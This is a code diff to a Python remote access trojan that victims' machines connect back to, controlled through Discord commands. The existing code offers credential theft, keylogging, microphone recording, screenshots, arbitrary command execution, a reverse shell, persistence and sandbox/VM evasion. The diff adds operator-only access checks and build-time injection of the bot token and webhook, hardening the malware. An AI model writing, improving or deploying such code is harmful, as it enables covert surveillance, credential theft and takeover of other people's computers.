@@ -30,12 +30,27 @@ import win32pdh
 from winreg import *
 from ctypes import *
 from libraries import credentials,keylogger,sandboxevasion,disctopia
+from libraries import secretbox
 
 
-GUILD = discord.Object(id = "{GUILD}")
-CHANNEL = {CHANNEL}
-KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"
+GUILD = discord.Object(id={GUILD_EXPR})
+CHANNEL = {CHANNEL_EXPR}
+KEYLOGGER_WEBHOOK = {WEBHOOK_EXPR}
 CURRENT_AGENT = 0
+
+OPERATOR_IDS = {OPERATOR_IDS}  # replaced at build time with a set of ints
+
+
+def _authorized(user_id: int) -> bool:
+    return int(user_id) in OPERATOR_IDS
+
+
+async def _deny_interaction(interaction: discord.Interaction) -> None:
+    embed = discord.Embed(title="Unauthorized", color=0xFF0000)
+    if interaction.response.is_done():
+        await interaction.followup.send(embed=embed, ephemeral=True)
+    else:
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
 class Bot(commands.Bot):
     def __init__(self):
@@ -46,7 +61,7 @@ class Bot(commands.Bot):
     async def on_ready(self):
         await self.wait_until_ready()
     
-        self.channel = self.get_channel(CHANNEL)
+        self.channel = self.get_channel(CHANNEL) or await self.fetch_channel(CHANNEL)
         now = datetime.now()
         my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
         my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
@@ -64,6 +79,13 @@ class Bot(commands.Bot):
         await self.tree.sync(guild = GUILD)
 
     async def on_command_error(self, ctx, error):
+        if isinstance(error, commands.CheckFailure):
+            embed = discord.Embed(title="Unauthorized", color=0xFF0000)
+            if ctx.interaction and not ctx.interaction.response.is_done():
+                await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
+            else:
+                await ctx.reply(embed=embed)
+            return
         my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
 
@@ -72,6 +94,12 @@ class InteractButton(discord.ui.View):
         super().__init__()
         self.inv  = inv
         self.id = id
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if _authorized(interaction.user.id):
+            return True
+        await _deny_interaction(interaction)
+        return False
 
     @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
     async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
@@ -163,6 +191,14 @@ class InteractButton(discord.ui.View):
 
 bot = Bot()
 
+
+@bot.check
+async def _ops_only(ctx: commands.Context):
+    if _authorized(ctx.author.id):
+        return True
+    raise commands.CheckFailure("Unauthorized")
+
+
 @bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
 @app_commands.guilds(GUILD)
 async def cmd(ctx: commands.Context, id:int):
@@ -192,6 +228,12 @@ async def cmd(ctx: commands.Context, command:str):
             os.remove(path)
         else:
             await ctx.reply("```"+result+"```")
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
@@ -225,6 +267,12 @@ async def webshot(ctx: commands.Context):
                 await ctx.reply(embed=my_embed)
     
         
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
 @bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
 @app_commands.guilds(GUILD)
 async def cd(ctx: commands.Context, path:str):
@@ -235,6 +283,12 @@ async def cd(ctx: commands.Context, path:str):
         else:
             my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
@@ -250,6 +304,12 @@ async def process(ctx: commands.Context):
             os.remove(path)
         else:
             await ctx.reply(f"```\n{result}\n```")
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
@@ -262,6 +322,12 @@ async def upload(ctx: commands.Context, url:str, name:str):
         else:
             my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
@@ -275,6 +341,12 @@ async def screenshot(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
@@ -288,6 +360,12 @@ async def creds(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
@@ -300,6 +378,12 @@ async def persistent(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
@@ -324,6 +408,12 @@ async def download(ctx: commands.Context, path:str):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
@@ -334,6 +424,12 @@ async def download(ctx: commands.Context):
         await ctx.reply(embed=my_embed)
         await bot.close()        
         sys.exit()
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
@@ -346,6 +442,12 @@ async def selfdestruct(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
@@ -363,6 +465,12 @@ async def location(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
@@ -373,6 +481,12 @@ async def location(ctx: commands.Context, ip:str, port:int):
         if result:
             my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
     
 @bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
@@ -390,6 +504,12 @@ async def recordmic(ctx: commands.Context, seconds:int):
             else:
                 my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
@@ -402,6 +522,12 @@ async def wallpaper(ctx: commands.Context, path_url:str):
         else:
             my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
@@ -414,6 +540,12 @@ async def killproc(ctx: commands.Context, pid:int):
         else:
             my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
@@ -427,6 +559,12 @@ async def keylog(ctx: commands.Context, mode:str ,interval:int):
         else:
             threading.Thread(target=logger.start).start()
             await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))
+    else:
+        await ctx.reply(embed=discord.Embed(
+            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
+            color=0xFF0000,
+        ))
+
     
 
 @bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
@@ -469,4 +607,4 @@ if sandboxevasion.test() == True and disctopia.isVM() == False:
         MSG =f"Agent Online #{ID}"
         COLOR = 0x0000FF
 
-    bot.run("{TOKEN}")
+    bot.run({TOKEN_EXPR})
